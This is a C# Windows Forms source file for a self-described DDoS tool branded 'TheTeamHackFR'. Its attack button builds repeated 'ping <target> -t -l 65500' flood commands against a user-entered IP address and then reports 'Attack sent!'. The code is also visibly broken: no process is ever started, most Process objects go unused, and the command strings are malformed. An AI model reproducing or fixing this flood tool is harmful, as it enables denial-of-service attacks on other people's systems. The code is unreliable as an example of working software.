using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;

namespace TheTeamHackFR_DDoS
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Thank for using TheTeamHackFR DoS, By TheTeamHackFR!");
            this.Close();
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            NotifyIcon trayIcon = new NotifyIcon();
            trayIcon.Icon = new Icon(@"C:\csharp.ico");
            trayIcon.Text = "TheTeamHackFR DDoS";
            trayIcon.Visible = true;
            trayIcon.ShowBalloonTip(2000, "TheTeamHackFR DDoS", "Window minimized!", ToolTipIcon.Info);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string IPTODDOS = ADRESSEIP.Text;
            Process  proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
            proc.StartInfo.UseShellExecute = false;
            progressBar1.Value = +10;
            Thread.Sleep(1000);
            Process proc2 = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
            proc.StartInfo.UseShellExecute = false;
            progressBar1.Value = +20;
            Thread.Sleep(1000);
            Process proc3 = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
            proc.StartInfo.UseShellExecute = false;
            progressBar1.Value = +30;
            Thread.Sleep(1000);
            Process proc4 = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
            proc.StartInfo.UseShellExecute = false;
            progressBar1.Value = +40;
            Thread.Sleep(1000);
            Process proc5 = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
            proc.StartInfo.UseShellExecute = false;
            progressBar1.Value = +50;
            Thread.Sleep(1000);
            Process proc6 = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
            proc.StartInfo.UseShellExecute = false;
            progressBar1.Value = +60;
            Thread.Sleep(1000);
            Process proc7 = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
            proc.StartInfo.UseShellExecute = false;
            progressBar1.Value = +70;
            Thread.Sleep(1000);
            Process proc8 = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
            proc.StartInfo.UseShellExecute = false;
            progressBar1.Value = +80;
            Thread.Sleep(1000);
            Process proc9 = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
            proc.StartInfo.UseShellExecute = false;
            progressBar1.Value = +90;
            Thread.Sleep(1000);
            Process proc100 = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
            proc.StartInfo.UseShellExecute = false;
            progressBar1.Value = +100;
            Thread.Sleep(1000);
            MessageBox.Show("Attack sent!");
        }

        private void button4_Click(object sender, EventArgs e)
        {
            progressBar1.Value = +0;
            MessageBox.Show("Attack stopped!");
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }
    }
}
